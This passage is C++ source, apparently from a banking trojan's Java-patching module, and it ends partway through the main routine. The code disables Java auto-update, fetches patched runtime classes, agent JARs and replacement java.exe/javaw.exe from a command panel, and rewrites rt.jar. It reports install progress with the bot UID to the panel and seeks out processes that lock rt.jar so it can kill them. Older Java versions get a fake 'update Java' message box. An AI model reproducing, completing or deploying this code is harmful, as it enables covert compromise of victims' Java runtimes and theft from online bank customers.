
#include "Modules.h"

//#ifdef JAVS_PATCHERH
//----------------------------------------------------------------------------
#include "java_patcher.h"
#include "BotHttp.h"
#include "Config.h"
#include "Memory.h"
#include "Strings.h"
#include "GetApi.h"
#include "Shlobj.h"
#include "ntdll.h"
#include "Utils.h"
#include "Modules.h"
#include "JavaConfig.h"
#include "Richedit.h"


#include "BotDebug.h"

namespace java_patcher
{
    #include "DbgTemplates.h"
}

#define DBG  java_patcher::DBGOutMessage<>

struct FILE_CRC32
{
	char fileName[32];
	unsigned long crc32;
};

static int javaVersion = 0; //версия явы в формате 106 == 1.6
static int javaVersion2 = 0; //версия явы в формате 10600 == 1.6.0
static int javaBuild = 0; //билд или апдейт текущей версии явы 
static int javaCompatible = 0; //совместимость явы для разных алгоритмов установки патча
static char javaHome[MAX_PATH]; //папка явы
static char javaMSI[MAX_PATH]; //папка с параметрами автообновления

char versionPatch[] = "1.7"; //версия патча

static char domain[128]; //адрес админки

static bool PatchIsLoaded();

//Определяет версию явы, возвращает true если ява есть, иначе false. Заодно в переменную javaHome ложит путь к яве
static bool GetJavaVersion()
{
	bool res = false;
	javaVersion = 0; 
	javaVersion2 = 0;
	javaBuild = 0; 
	javaCompatible = -1;
	javaHome[0] = 0;

	const char* nameKeyJava = "SOFTWARE\\JavaSoft\\Java Runtime Environment";

	char* ver1 = Registry::GetStringValue( HKEY_LOCAL_MACHINE, (PCHAR)nameKeyJava, "CurrentVersion" );
	if( ver1 )
	{
		//извлекаем домашнюю папку явы
		char keyVer[MAX_PATH];
		m_lstrcpy( keyVer, nameKeyJava );
		pPathAppendA( keyVer, ver1 );
		char* s = Registry::GetStringValue( HKEY_LOCAL_MACHINE, keyVer, "JavaHome" );
		m_lstrcpy( javaHome, s );
		STR::Free(s);
		DBG( "JavaPatcher", "java home: %s", javaHome );
		//конвертируем версию явы в целое число
		char* p = STR::Scan( ver1, '.' );
		if( p ) 
		{
			*p = 0;
			javaVersion = StrToInt(ver1) * 100 + StrToInt(p + 1); //в результате получаем 1.6 в 106
			const char* family = (javaVersion == 106) ? "Java6FamilyVersion" : "Java7FamilyVersion";
			char* ver2 = Registry::GetStringValue( HKEY_LOCAL_MACHINE, (PCHAR)nameKeyJava, (char*)family );
			fwsprintfA pwsprintfA = Get_wsprintfA();
			pwsprintfA( javaMSI, "%s\\%s\\MSI", nameKeyJava, ver2 ); 
			if( ver2 )
			{
				//анализируем строку вида 1.6.0_30
				p = STR::Scan( ver2, '.' );
				if( p )
				{
					char* p2 = STR::Scan( p + 1, '.' );
					if( p2 )
					{
						char* p3 = STR::Scan( p2 + 1, '_' );
						if( p3 )
						{
							*p = *p2 = *p3 = 0;
							javaVersion2 = StrToInt(ver2) * 10000 + StrToInt(p + 1) * 100 + StrToInt(p2 + 1); //1.6.0 -> 10600
							javaBuild = StrToInt(p3 + 1);
							//устанавливаем совместимость
							switch( javaVersion )
							{
								case 106: //1.6
									if( javaBuild < 10 )
										javaCompatible = 0;
									else
										if( javaBuild < 18 )
											javaCompatible = 1;
										else
											javaCompatible = 2;
									break;
								case 107: //1.7
									javaCompatible = 3;
									break;
							}
							DBG( "JavaPatcher", "java version %d, %d, %d", javaVersion, javaVersion2, javaBuild );
							DBG( "JavaPatcher", "java compatible %d", javaCompatible );
							res = true;
						}
					}
				}
			}
			STR::Free(ver2);
		}
		STR::Free(ver1);
	}
	return res;
}

//отключает в реестре автообновление явы, функция работает только после выполнении функции GetJavaVersion()
static bool OffUpdateJava()
{
	if( !Registry::SetValueString( HKEY_LOCAL_MACHINE, javaMSI, "AUTOUPDATECHECK", "0" ) )
		return false;
	if( !Registry::SetValueString( HKEY_LOCAL_MACHINE, javaMSI, "JAVAUPDATE", "0" ) )
		return false;
	if( !Registry::SetValueDWORD( HKEY_LOCAL_MACHINE, "SOFTWARE\\JavaSoft\\Java Update\\Policy", "EnableJavaUpdate", 0 ) )
		return false;
	DBG( "JavaPatcher", "отключено обновление явы" );
	return true;
}

const char* GetJREPath()
{
	if( GetJavaVersion() )
		return javaHome;
	return 0;
}

static char* GetJavaPatcherURL( char* url )
{
	// Функция возвращает адрес скрипта

	/*

	Не удалил код чтоб обратить на него внимание.
	дебаговый хост прописан в модуле JavaConfig.h
	Это важно потому, что в ибанке проверяется к
	какому хосту идёт подключение, соответственно если
	прописать хост здесь то ибанк не корректно
	отрабатывает в отладочной версии

	Игорь, как прочитаешь этот коммент, удали код.



	#ifdef DEBUGCONFIG
		m_lstrcpy( url, "http://bifitibsystem.org/" );//"http://94.240.148.127/");//);//rt_jar/");
		return url;
	#endif
	*/


	PCHAR URL = NULL;
	do
	{
		#ifdef JavaConfigH
			URL = GetJavaScriptURL(0);//JavaPatcherURLPath);
		#else
			URL = GetBotScriptURL(0, 0);//JavaPatcherURLPath);
		#endif
		if (URL == NULL)
        	pSleep(60000);
	}
	while(URL == NULL);

	if( URL )
		m_lstrcpy( url, URL );
	else
		url[0] = 0;
	return url;
}

//инициализирует глобальные переменные 
static bool InitData()
{
	if( GetJavaPatcherURL(domain) == 0 ) return false;
	return true;
}


//возвращает рабочую папу для патчера, и если указано, то добавляем имя файла
static char* GetWorkFolder( char* path, const char* fileName = 0 )
{
	/*
	pSHGetFolderPathA( 0, CSIDL_COMMON_APPDATA ,  0, 0, path );
	pPathAppendA( path, "IBank" );
	if( !Directory::IsExists(path) )
		if( pCreateDirectoryA( path, 0 ) == 0 ) 
			return 0;
	*/
	GetAllUsersProfile( path, MAX_PATH );
	if( fileName )
		pPathAppendA( path, fileName );
	return path;
}

static void SendLogToAdmin( int num )
{
	char qr[128];
	fwsprintfA pwsprintfA = Get_wsprintfA();
	pwsprintfA( qr, "%sb.php?uid=%s&c=setup_patch&v=%d&jv=%d&botver=%s", domain, BOT_UID, num, javaVersion2, versionPatch  );
	THTTPResponse Response;
	ClearStruct(Response);
	HTTP::Get( qr, 0, &Response );
	DBG( "JavaPatcher", "Отсылка лога: %s", qr );
	HTTPResponse::Clear(&Response);
	STR::Free(qr);
}

static bool RunCmd( const char* exe, const char* cmd )
{
//	return true;
	SHELLEXECUTEINFOA in;
	m_memset( &in, 0, sizeof(SHELLEXECUTEINFOA) );

	in.cbSize = sizeof(SHELLEXECUTEINFOA);
	in.fMask = SEE_MASK_NOCLOSEPROCESS;
	in.hwnd = NULL;
	in.lpFile =  exe;
	in.nShow = SW_HIDE;
	in.lpParameters = cmd;

	DBG( "JavaPatcher", "ShellExecuteEx(%s %s) START", exe, cmd );
	bool res = (BOOL)pShellExecuteExA(&in) == TRUE;
	pWaitForSingleObject(in.hProcess, -1);
	pTerminateProcess(in.hProcess, 0);
	DBG( "JavaPatcher", "ShellExecuteEx() STOP - %d", (int)res );

	return res;
}

static bool UnpackToDir(const char* jarFileName, const char* dstFolder, const char* jarExePath)
{
	pSetCurrentDirectoryA(dstFolder);
	    
	char rtAddFolder[MAX_PATH];
	m_lstrcpy( rtAddFolder, dstFolder );
	m_lstrcat( rtAddFolder, "\\rt_add.jar" );
	
	if( (BOOL)pCopyFileA( jarFileName, rtAddFolder, FALSE ) )
	{
		bool res = RunCmd( jarExePath, " -xf rt_add.jar" );
		pDeleteFileA(rtAddFolder);
		return res;
	}
	return false;
}

static bool UID_To_File(char* BotUid)
{
	char uidTxt[MAX_PATH];
	if(	GetWorkFolder( uidTxt, "uid.txt" ) )
	{
		if( !File::IsExists(uidTxt) )
		{
			char _BotUid[100];
			if( BotUid == 0 )
			{
				GenerateUid(_BotUid);
				BotUid = _BotUid;
			}

			DBG( "JavaPatcher", ">>>>>>>>>>>>>>> Пишем уид в файл  %s", BotUid);

			if( File::WriteBufferA( uidTxt, BotUid, m_lstrlen(BotUid) ) > 0 )
				return true;
		}
		else
			return true;
	}
	return false;
}

static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAddPath, const char* iniFilePath, const char* iniFilePath2, const char* jarExePath, char* libPath )
{
	DBG( "JavaPatcher", "Unpacking rt_add.jar" );
	if( !UnpackToDir( rtAddPath, tmpRtPath, jarExePath ) )
	{
		DBG( "JavaPatcher", "UnpackToDir rt_add.jar ERROR" );
		return false;
	}

	// Сохраняем путь в lib папку jre для возврата
	m_lstrcpy( libPath, javaHome );
	pPathAppendA( libPath, "lib" );

	char allUsersProfile[MAX_PATH];
	if( !GetWorkFolder(allUsersProfile) )
		return false;

	if( pSetCurrentDirectoryA(allUsersProfile) == 0 )
		return false;

	pDeleteFileA( ".\\statusFile.txt" );
	pDeleteFileA( ".\\unsigned.txt" );
	pDeleteFileA( ".\\rt.ini" );
	pDeleteFileA( ".\\file.dat" );
	pDeleteFileA( ".\\uid.txt" );
	pDeleteFileA( ".\\rt2.log" );

	if( pCopyFileA( iniFilePath, ".\\rt.ini", FALSE) == 0 )
		return false;
	if( pCopyFileA( iniFilePath2, ".\\rt_p.ini", FALSE) == 0 )
		return false;

	if( pSetCurrentDirectoryA(javaHome) == 0 )
		return false;

	if( pCopyFileA( ".\\lib\\rt.jar",  ".\\lib\\rt2.jar", FALSE ) == 0 )
		return false;

	if( pSetCurrentDirectoryA(tmpRtPath) == 0 )
		return false;

	char cmd[MAX_PATH];
	m_lstrcpy( cmd, " -uf \"" );
	m_lstrcat( cmd, javaHome );
	m_lstrcat( cmd, "\\lib\\rt2.jar\" \".\\" );
	RunCmd( jarExePath, cmd );

	pSetCurrentDirectoryA(javaHome);

	BOOL bres = (BOOL)pCopyFileA( ".\\lib\\rt.jar", ".\\lib\\rt_.jar", TRUE );
	DWORD err = (DWORD)pGetLastError();
	if( !bres && err != ERROR_FILE_EXISTS )
	{
		DBG( "JavaPatcher", "Err: Can`t copy rt.jar -> rt_.jar, %d", err );
		return false;
	}
	if( pCopyFileA( ".\\lib\\rt.jar", ".\\lib\\rtB.jar", FALSE ) == 0 )
	{
		DBG( "JavaPatcher", "Err: Can`t copy rt.jar -> rtB.jar" );
		return false;
	}

	//установка файла-флага
	pPathAppendA( allUsersProfile, "copy.dat" );
	File::WriteBufferA( allUsersProfile, 0, 0 );

	DBG( "JavaPatcher", "Done!" );

	return true;
}

static char* DownloadPlugin( char *url, DWORD *dwLen, bool crypt )
{
	PCHAR data = 0;
	DBG( "JavaPatcher", "DownloadPlugin %s", url );
	THTTPResponse Response;
	ClearStruct(Response);
	HTTP::Get( url, &data, &Response );
	*dwLen = Response.ContentLength;
	return data;
}

static FILE_CRC32* LoadCorrectCRC32( const char* baseUrl )
{
	FILE_CRC32* filesСrc32 = 0;
	int count = 0;
	
	char url[256];
	m_lstrcpy(url, baseUrl);
	m_lstrcat(url, "CRC32.txt");
	
	DWORD crc32Len = 0;

	char* crc32Data = (char*)DownloadPlugin( url, &crc32Len, false );

	if (!crc32Data)
	{
		DBG( "JavaPatcher", "LoadCorrectCRC32 DownloadPlugin Failed" );
		return 0;
	}
	else
	{
		char* context = 0;
		char* crc32Data2 = crc32Data;
		while( true )
		{
			char* part = m_strtok_s( crc32Data2, "\r\n", &context ); 
			if( part == 0 ) break;
			char* val = STR::Scan( part, '=' );
			if( val )
			{
				filesСrc32 = (FILE_CRC32*)MemRealloc( filesСrc32, (count + 2) * sizeof(FILE_CRC32) );
				m_memset( filesСrc32 + count + 1, 0, sizeof(FILE_CRC32) );

				*val++ = 0; //разделили имя файла и значение crc32

				int lenKey = m_lstrlen(part);
				if( lenKey > sizeof(filesСrc32->fileName) - 1 )
					lenKey = sizeof(filesСrc32->fileName) - 1;
				m_memcpy( filesСrc32[count].fileName, part, lenKey );
				filesСrc32[count].fileName[lenKey] = 0;
				filesСrc32[count].crc32 = (unsigned long)STR::ToDWORD(val);
				count++;
			}
			crc32Data2 = 0;
		}
	}
	STR::Free(crc32Data);

	return filesСrc32;
}

static unsigned long GetCorrectCRC32( FILE_CRC32* filesCrc32, const char* fileName )
{
	while( filesCrc32->crc32 != 0 )
	{
		if( m_lstrcmp( filesCrc32->fileName, fileName ) == 0 )
			return filesCrc32->crc32;
		filesCrc32++;
	}
	return 0;
}

static bool DownloadPlugin( FILE_CRC32* filesCrc32, const char* baseUrl, const char* addUrl, const char* fileName, const char* crcName )
{
	char url[256];
	m_lstrcpy( url, baseUrl );
	m_lstrcat( url, addUrl );
	bool res = false;
	for(;;)
	{
		DWORD szData;
		char* data = DownloadPlugin( url, &szData, false );
		if( data )
		{
			unsigned long crc1 = GetCRC32( data, szData );
			unsigned long crc2 = GetCorrectCRC32( filesCrc32, crcName );
			if( crc1 == crc2 )
			{
				DWORD saved = File::WriteBufferA( (char*)fileName, data, szData );
				if( saved == szData )
				{
					res = true;
				}
				else
					DBG( "JavaPatcher", "Error saved %s, loaded size (%d) != saved size (%d)", fileName, szData, saved );
			}
			else
				DBG( "JavaPatcher", "Error crc32 for %s", url );
			STR::Free(data);
			data = 0;
			if( res ) break;
			pSleep(2000);
		}
		else
		{
			DBG( "JavaPatcher", "Failed Download %s", url );
			pSleep(3 * 60000); //ждем 3 минуты, и потом снова пытаемся загрузить
		}
	}
	return res;
}

static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* iniFilePath, char* iniFilePath2, char* jarExeFilePath, char* javaExe, char* javaExew )
{
	FILE_CRC32* filesCrc32 = LoadCorrectCRC32(baseUrl);

	if( !filesCrc32 )
	{
		DBG( "JavaPatcher", "Failed Download CRC32" );
		return false;
	};

	DBG( "JavaPatcher",  "Start Downloading" );

	const char* addUrl = 0;
	const char* crcName = 0;

	switch( javaCompatible )
	{
		case 1:  addUrl = "6u17/rt_add.jar"; crcName = "6u17_rt_add.jar"; break;
		case 2:  addUrl = "6u18/rt_add.jar"; crcName = "6u18_rt_add.jar"; break;
		case 3:  addUrl = "7uXX/rt_add.jar"; crcName = "7uXX_rt_add.jar"; break;
		default: addUrl = "6u17/rt_add.jar"; crcName = "6u17_rt_add.jar"; break;
	}
	File::GetTempName(rtAddFilePath);
//	GetWorkFolder( rtAddFilePath, "rt_add.jar" );
	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, rtAddFilePath, crcName ) )
		return false;

	addUrl = "rt.ini";
	crcName = addUrl;
	File::GetTempName(iniFilePath);
	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, iniFilePath, crcName ) )
		return false;

	addUrl = "rt_p.ini";
	crcName = addUrl;
	File::GetTempName(iniFilePath2);
	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, iniFilePath2, crcName ) )
		return false;

	//загрузка файлов во временную папку
	char Path[MAX_PATH], fileName[MAX_PATH];
	pGetTempPathA( sizeof(Path), Path );

	switch( javaVersion )
	{
		case 106: addUrl = "6/jar.exe"; crcName = "6_jar.exe"; break;
		case 107: addUrl = "7/jar.exe"; crcName = "7_jar.exe"; break;
		default: addUrl = 0; crcName = 0; break;
	}
	if( addUrl == 0 ) return false;

	m_lstrcpy( jarExeFilePath, Path );
	pPathAppendA( jarExeFilePath, "jar.exe" );
//	File::GetTempName(jarExeFilePath);
	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, jarExeFilePath, crcName ) )
		return false;
	
	switch( javaVersion )
	{
		case 106: addUrl = "6/jli.dll"; crcName = "6_jli.dll"; break;
		case 107: addUrl = "7/jli.dll"; crcName = "7_jli.dll"; break;
		default: addUrl = 0; crcName = 0; break;
	}
	if( addUrl == 0 ) return false;
	m_lstrcpy( fileName, Path );
	pPathAppendA( fileName, "jli.dll" );
	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, fileName, crcName ) )
		return false;

	char* realName = 0;
	switch( javaVersion )
	{
		case 106: realName = "msvcr71.dll"; addUrl = "6/msvcr71.dll"; crcName = "6_msvcr71.dll"; break;
		case 107: realName = "msvcr100.dll"; addUrl = "7/msvcr100.dll"; crcName = "7_msvcr100.dll"; break;
		default: addUrl = 0; crcName = 0; break;
	}
	if( addUrl == 0 ) return false;
	m_lstrcpy( fileName, Path );
	pPathAppendA( fileName, realName );
	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, fileName, crcName ) )
		return false;

	crcName = addUrl = "java.exe";
	m_lstrcpy( javaExe, Path );
	pPathAppendA( javaExe, addUrl );
	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, javaExe, crcName ) )
		return false;

	crcName = addUrl = "javaw.exe";
	m_lstrcpy( javaExew, Path );
	pPathAppendA( javaExew, addUrl );
	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, javaExew, crcName ) )
		return false;

	SendLogToAdmin(2);
	//загрузка в папку ALLUSERSPROFILE
	//GetAllUsersProfile( Path, sizeof(Path) );
	if( GetWorkFolder(Path) == 0 )
		return false;

	const char* miscFiles[] = { "Agent.jar", "AgentPassive.jar", "jni.dll", "client2015.jar", 0 };//"AgentKP.jar", 0 };
	const char** ss = miscFiles;
	while( *ss ) 
	{
		addUrl = *ss;
		crcName = addUrl;
		m_lstrcpy( fileName, Path );
		pPathAppendA( fileName, addUrl );
		if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, fileName, crcName ) )
			return false;
		ss++;
	}

	SendLogToAdmin(3);

	addUrl = "javassist.jar";
	crcName = addUrl;
	m_lstrcpy( fileName, Path );
	pPathAppendA( fileName, "lib" );
	if( !Directory::IsExists(fileName) ) 
		pCreateDirectoryA( fileName, 0 );
	pPathAppendA( fileName, addUrl );
	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, fileName, crcName ) )
		return false;

	DBG( "JavaPatcher",  "Downloading Complete" );

	return true;
}

 static bool PatchRtJar( const char* userName, const char* baseUrl, char* libPatch, char* javaExe, char* javaExew )
{
	MemPtr<MAX_PATH> tmpRtPath;
	pGetTempPathA( tmpRtPath.size(), (char*) tmpRtPath );
	pPathAppendA( (char*) tmpRtPath, "rt" );
 
	if( File::IsExists(tmpRtPath) )
		Directory::Clear(tmpRtPath);
	else
		pCreateDirectoryA( (char*)tmpRtPath, NULL );

	MemPtr<MAX_PATH> rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath;

	bool res = false;
	if( DownloadAndSave( baseUrl, rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath, javaExe, javaExew ) )
	{
		if( Patch( userName, tmpRtPath, rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath, libPatch ) )
			res = true;
	}
	
	Directory::Delete(tmpRtPath);

	return res;
}

 
 static UCHAR GetFileHandleType()
{
	HANDLE                     hFile;
	PSYSTEM_HANDLE_INFORMATION Info;
	ULONG                      r;
	UCHAR                      Result = 0;

	hFile = (HANDLE)pCreateFileA("NUL", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		Info = (PSYSTEM_HANDLE_INFORMATION)GetInfoTable(SystemHandleInformation);

		if (Info)
		{
			for (r = 0; r < Info->uCount; r++)
			{
				if (Info->aSH[r].Handle == (USHORT)hFile && 
					Info->aSH[r].uIdProcess == (DWORD)pGetCurrentProcessId())
				{
					Result = Info->aSH[r].ObjectType;
					break;
				}
			}

		    MemFree(Info);
		}

		pCloseHandle(hFile);
	}
	return Result;
}

 typedef struct _NM_INFO
{
	HANDLE  hFile;
	FILE_NAME_INFORMATION Info;
	WCHAR Name[MAX_PATH];
} NM_INFO, *PNM_INFO;

static DWORD WINAPI GetFileNameThread(PVOID lpParameter)
{
	PNM_INFO        NmInfo = (PNM_INFO)lpParameter;
	IO_STATUS_BLOCK IoStatus;

	if (NT_SUCCESS(pZwQueryInformationFile(NmInfo->hFile, &IoStatus, &NmInfo->Info, 
                          sizeof(NM_INFO) - sizeof(HANDLE), FileNameInformation)) )
		return 1;

	return 0;
}

static void GetFileName(HANDLE hFile, PCHAR TheName)
{
	HANDLE   hThread;
	PNM_INFO Info = (PNM_INFO)MemAlloc(sizeof(NM_INFO));//HeapAlloc(hHeap, 0, sizeof(NM_INFO));
	
	Info->hFile = hFile;
	hThread = (HANDLE)pCreateThread(NULL, 0, GetFileNameThread, Info, 0, NULL);
	
	if ((DWORD)pWaitForSingleObject(hThread, 100) == WAIT_TIMEOUT)
	{
	   pTerminateThread(hThread, 0);
	   pCloseHandle(hThread);
	}

	DWORD res = -1;
	BOOL err = GetExitCodeThread(hThread, &res);

	TheName [ 0 ] = 0; 
	pWideCharToMultiByte(CP_ACP, 0, Info->Info.FileName - 4, Info->Info.FileNameLength >> 1, TheName, MAX_PATH, NULL, NULL);
	MemFree(Info);
}

 

static int FindBlockingProcesses( char* FileName, ULONG** PIDs )
{
	PSYSTEM_HANDLE_INFORMATION Info;
	ULONG                      r;
	CHAR                       Name[MAX_PATH];
	HANDLE                     hProcess, hFile;
	UCHAR                      ObFileType;

	int procCount = 0;


	ObFileType = GetFileHandleType();

	Info = (PSYSTEM_HANDLE_INFORMATION)GetInfoTable(SystemHandleInformation);

	if (Info)
	{
		for (r = 0; r < Info->uCount; r++)
		{
			if (Info->aSH[r].ObjectType == ObFileType)
			{
				hProcess = (HANDLE)pOpenProcess(PROCESS_DUP_HANDLE, FALSE, Info->aSH[r].uIdProcess);

				if (hProcess)
				{
					if (pDuplicateHandle(hProcess, (HANDLE)Info->aSH[r].Handle,
						(HANDLE)pGetCurrentProcess(), &hFile, 0, FALSE, DUPLICATE_SAME_ACCESS))
					{
 						GetFileName( hFile, Name );
						StrLowerCase(Name);
							
						//DBG( "JavaPatcher", "File busy %s", Name );
						if( Name[0] != 0 && m_strstr( Name, FileName ) != NULL )
						{
							*PIDs = (ULONG*)MemRealloc( *PIDs, (procCount + 1) * sizeof(ULONG) );
							(*PIDs)[procCount] = Info->aSH[r].uIdProcess;
							procCount++;
						}
						pCloseHandle(hFile);
					}
					pCloseHandle(hProcess);
				}
			}
		}
		MemFree(Info);
	}
	return procCount;
}


///////////////////////////////////////////////////////////////////////////////
HHOOK hMsgBoxHook;
HCURSOR hArrow,hIbeam;

static INT_PTR CALLBACK EditDlgProc( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam )
{
	WNDPROC lpWndProc = (WNDPROC)pGetWindowLongPtrA( hWnd, GWLP_USERDATA );
    
	switch (uMsg)
    {
        case WM_SETFOCUS:
            return 1;
        case WM_MOUSEWHEEL:
            return NULL;
    }
    
	if( pGetCursor() == hIbeam )
        pSetCursor(hArrow);
    
	return (INT_PTR)pCallWindowProcA( lpWndProc, hWnd, uMsg, wParam, lParam );
}

static INT_PTR CALLBACK StaticDlgProc( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam )
{
    bool bCursor = false;
	WNDPROC lpWndProc = (WNDPROC)pGetWindowLongPtrA( hWnd, GWLP_USERDATA );
    switch (uMsg)
    {
        case WM_NOTIFY:
            switch (((LPNMHDR)lParam)->code)
            {
                case EN_LINK:
                {
                    ENLINK *lpLink = (ENLINK*)lParam;
                    if( lpLink->msg == WM_LBUTTONUP )
                    {
						pSendMessageA( lpLink->nmhdr.hwndFrom, EM_EXSETSEL, 0, (LPARAM)&lpLink->chrg );
                        TCHAR szBuf[260];
						pSendMessageA( lpLink->nmhdr.hwndFrom, EM_GETSELTEXT, 0, (LPARAM)szBuf );
						pShellExecuteA( NULL," open", szBuf, NULL, NULL, SW_SHOWNORMAL );
                    }
                    bCursor = true;
                    break;
                }
            }
            break;
    }
    return (LRESULT)pCallWindowProcA( lpWndProc, hWnd, uMsg, wParam, lParam );
}

static LRESULT CALLBACK MsgProc( int nCode, WPARAM wParam, LPARAM lParam )
{
    if( nCode == HC_ACTION )
    {
        CWPSTRUCT *lpMsg=(CWPSTRUCT*)lParam;
        switch( LOWORD(lpMsg->message) )
        {
            case WM_INITDIALOG:
			{
                HWND hStatic = (HWND)pGetDlgItem( lpMsg->hwnd, 0xFFFF );

                RECT rcStatic;
                pGetClientRect( hStatic, &rcStatic );
                TCHAR szBuf[260];
				pGetWindowTextA( hStatic, szBuf, sizeof(szBuf) );
				HGDIOBJ hFont = (HGDIOBJ)pSendMessageA( hStatic, WM_GETFONT, NULL, NULL );
                HWND hRich = (HWND)pCreateWindowExA( WS_EX_NOPARENTNOTIFY, RICHEDIT_CLASS, NULL, WS_CHILD | ES_READONLY | WS_VISIBLE | ES_MULTILINE, 0, 0, 
							rcStatic.right - rcStatic.left + 2, rcStatic.bottom - rcStatic.top, hStatic, NULL, NULL, NULL );
                pSendMessageA( hRich, WM_SETFONT, (WPARAM)hFont, 0 );
                pSendMessageA( hRich, EM_SETBKGNDCOLOR, 0 ,GetSysColor(COLOR_BTNFACE) );
                pSendMessageA( hRich, EM_SETEVENTMASK, 0, ENM_LINK );
                pSendMessageA( hRich, EM_AUTOURLDETECT, TRUE, 0 );
				pSetWindowTextA( hRich, szBuf );
                POINT pt = { rcStatic.left, rcStatic.top };
                pScreenToClient( lpMsg->hwnd, &pt );
			
                pSetWindowLongA( hStatic, GWLP_USERDATA, (LONG)pSetWindowLongA( hStatic, GWLP_WNDPROC, (LONG)StaticDlgProc ) );
                pSetWindowLongA( hRich, GWLP_USERDATA,(LONG)pSetWindowLongA( hRich, GWLP_WNDPROC, (LONG)EditDlgProc ) );
                break;
            }
        }
    }
    return (LRESULT)pCallNextHookEx( hMsgBoxHook, nCode, wParam, lParam );
}

static int WINAPI ShowHypeMessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType )
{
    int dwResult = 0;
    hMsgBoxHook = (HHOOK)pSetWindowsHookExA( WH_CALLWNDPROC, MsgProc, NULL, pGetCurrentThreadId() );
	dwResult = (int)pMessageBoxA( hWnd, lpText, lpCaption, uType );
	pUnhookWindowsHookEx(hMsgBoxHook);
    return dwResult;
}

///////////////////////////////////////////////////////////////////////////////
bool WINAPI ClearAndDel( LPVOID lpData )
{
	if( !GetJavaVersion() ) return false;
	if( javaCompatible > 0 ) return true;
	char rt[MAX_PATH];
	m_lstrcpy( rt, javaHome );
	pPathAppendA( rt, "rt.jar" );
	pDeleteFileA(rt);

	HCURSOR hIbeam=(HCURSOR)pLoadCursorA(0,IDC_IBEAM);
	HCURSOR hArrow=(HCURSOR)pLoadCursorA(0,IDC_ARROW);
	HMODULE Lib=(HMODULE)pLoadLibraryA("riched20");
	ShowHypeMessageBox(0,"У вас старая версия явы,работа на ней не поддерживается,\nскачайте новую версию на сайте http://www.java.com", "Warning", MB_ICONASTERISK);
	//pFreeLibrary(Lib);
	return false;
}

//-----------------------------------------------------------------------------

/*
static bool WJFile()
{
	// Функция создаёт файл пидов
	char wj[MAX_PATH];
	GetAllUsersProfile( wj, sizeof(wj), "wj.dat" );
	
	if( !File::IsExists(wj) )
	{
		DBG( "JavaPatcher", "not exist %s", wj );
		if( File::WriteBufferA( wj, NULL, 0 ) == -1 )
		{
			pMoveFileExA( wj, NULL, MOVEFILE_DELAY_UNTIL_REBOOT );
			return true;
		}
		else
			return false;
	}
	else
	{
		DBG( "JavaPatcher",  "file exist %s", wj );
		return true;
	}
} */


// Функция создаёт файл пидов
static bool WJFile()
{
	char wj[MAX_PATH];
	if (!GetWorkFolder( wj, JavaPatcherPidsFile ))
		return false;

	if( !File::IsExists(wj))
	{
		File::WriteBufferA( wj, NULL, 0 );
	}

	return File::IsExists(wj);
}

static bool ReplacementExe(const char* java, const char* javao, const char* javaExe)
{
	MemPtr<MAX_PATH> srcJava, dstJava;
	m_lstrcpy( srcJava, javaHome );
	pPathAppendA( srcJava.str(), "bin" );
	m_lstrcpy( dstJava, srcJava );
	pPathAppendA( srcJava.str(), java );
	pPathAppendA( dstJava.str(), javao );
	bool ret = true;
	if( !File::IsExists(dstJava.str()) ) //если подмены еще не было
	{
		if( pMoveFileA( srcJava.str(), dstJava.str() ) )
		{
			DBG( "JavaPatcher", "rename %s -> %s", srcJava.str(), dstJava.str() );
		}
		else
		{
			DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
			pMoveFileExA( srcJava.str(), dstJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
			pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
			ret = false;
		}
	}
	if( ret )
	{
		if( pCopyFileA( javaExe, srcJava.str(), FALSE ) )
		{
			DBG( "JavaPatcher", "copy OK %s -> %s", javaExe, srcJava.str() );
			pDeleteFileA(javaExe);
		}
		else //не удалось скопировать, сделаем это после ребута
		{
			pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
		}
	}
	return ret;
}

//возвращает true если патч установлен
static bool PatchIsLoaded()
{
	char uidTxt[MAX_PATH];
	if( GetWorkFolder( uidTxt, "uid.txt" ) == 0 )
		return true;
	if( File::IsExists(uidTxt) ) //уже пропатчили
		return true;
	return false;
}

DWORD WINAPI JavaPatch( LPVOID lpData )
{
	WJFile();
	OffUpdateJava();

	MemPtr<513> user;
	MemPtr<MAX_PATH> path, javaExe, javaExew;
	char botUid[100];
	GenerateUid(botUid);

	PCHAR javaUrl = STR::New( 2, domain, "rt_jar/" );

	DBG( "JavaPatcher", "файлы для патча грузим с %s", javaUrl );

	DWORD userLen = user.size();
	bool res = false;

	if( pGetUserNameA( (char*)user, &userLen ) )
	{
		char *srcFile, *dstFile;
		*path.str() = 0;
		if( PatchRtJar( user, javaUrl, path, javaExe, javaExew ) )
		{
			UID_To_File(botUid);

			srcFile = user.str();
			dstFile = path.str();

			m_lstrcpy( srcFile, path );
			pPathAppendA( srcFile, "rt2.jar" );
			pPathAppendA( dstFile, "rt.jar" );
						
			ULONG *PIDS = NULL;

			int counter = 0; //счетчик попыток уничтожения процессов
			int countProcess;
			while( ( countProcess = FindBlockingProcesses( "\\lib\\rt.jar", &PIDS ) ) && counter < 3 )
			{
				counter++;
				while( countProcess-- )
				{
					DBG( "JavaPatcher",  "Killing process %d", PIDS[countProcess] );
